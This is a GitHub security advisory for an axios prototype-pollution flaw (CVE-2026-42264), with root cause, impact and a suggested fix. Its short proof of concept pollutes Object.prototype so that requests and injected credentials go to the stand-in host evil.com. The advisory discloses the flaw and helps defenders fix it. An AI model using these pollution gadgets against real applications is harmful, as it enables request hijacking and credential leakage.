# [H] Axios has prototype pollution read-side gadgets in HTTP adapter that allow credential injection and request hijacking

## Summary
Severity: High
Advisory: GHSA-q8qp-cvcw-x6jj
CVE: CVE-2026-42264
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-05-05
Source: https://github.com/advisories/GHSA-q8qp-cvcw-x6jj
Type: github-advisory

## Affected
- npm: `axios` — affected >=1.0.0 <1.15.2

## Details
## Summary

Five config properties in the HTTP adapter are read via direct property access without `hasOwnProperty` guards, making them exploitable as prototype pollution gadgets. When `Object.prototype` is polluted by another dependency in the same process, axios silently picks up these polluted values on every outbound HTTP request.

## Affected Properties

1. **`config.auth`** (`lib/adapters/http.js` line 617)  Injects attacker-controlled `Authorization` header on all requests.
2. **`config.baseURL`** (`lib/helpers/resolveConfig.js` line 18) Redirects all requests using relative URLs to an attacker-controlled server.
3. **`config.socketPath`** (`lib/adapters/http.js` line 669) Redirects requests to internal Unix sockets (e.g. Docker daemon).
4. **`config.beforeRedirect`** (`lib/adapters/http.js` line 698) Executes attacker-supplied callback during HTTP redirects.
5. **`config.insecureHTTPParser`** (`lib/adapters/http.js` line 712) Enables Node.js insecure HTTP parser on all requests.

## Proof of Concept

```javascript
const axios = require('axios');

// Prototype pollution from a vulnerable dependency in the same process
Object.prototype.auth = { username: 'attacker', password: 'exfil' };
Object.prototype.baseURL = 'https://evil.com';

await axios.get('/api/users');
// Request is sent to: https://evil.com/api/users
// With header: Authorization: Basic YXR0YWNrZXI6ZXhmaWw=
// Attacker receives both the request and injected credentials
```

## Impact

- **Credential injection:** Every axios request includes an attacker-controlled `Authorization` header, leaking request contents to any server that logs auth headers.
- **Request hijacking:** All requests using relative URLs are silently redirected to an attacker-controlled server.
- **SSRF:** Requests can be redirected to internal Unix sockets, enabling container escape in Docker environments.
- **Code execution:** Attacker-supplied functions execute during HTTP redirects.
- **Parser weakening:** Insecure HTTP parser enabled on all requests, enabling request smuggling.

## Root Cause

`mergeConfig()` iterates `Object.keys({...config1, ...config2})`, which only returns own properties. When neither the defaults nor the user config sets these properties, they are absent from the merged config. The HTTP adapter then reads them via direct property access (`config.auth`, `config.socketPath`, etc.), which traverses the prototype chain and picks up polluted values.

The `own()` helper at `lib/adapters/http.js` line 336 exists and guards 8 other properties (`data`, `lookup`, `family`, `httpVersion`, `http2Options`, `responseType`, `responseEncoding`, `transport`) from this exact attack. The 5 properties listed above are not included in this protection.

## Suggested Fix

Apply the existing `own()` helper to all affected properties:

```javascript
const configAuth = own('auth');
if (configAuth) {
  const username = configAuth.username || '';
  const password = configAuth.password || '';
  auth = username + ':' + password;
}
```

Same pattern for `socketPath`, `beforeRedirect`, `insecureHTTPParser`, and a `hasOwnProperty` check for `baseURL` in `resolveConfig.js`.

## References
- https://github.com/axios/axios/security/advisories/GHSA-q8qp-cvcw-x6jj
- https://nvd.nist.gov/vuln/detail/CVE-2026-42264
- https://github.com/axios/axios/pull/10779
- https://github.com/axios/axios/commit/47915144662f2733e6c051bdcb895a8c8f0586aa
- https://github.com/axios/axios
- https://github.com/axios/axios/releases/tag/v1.15.2
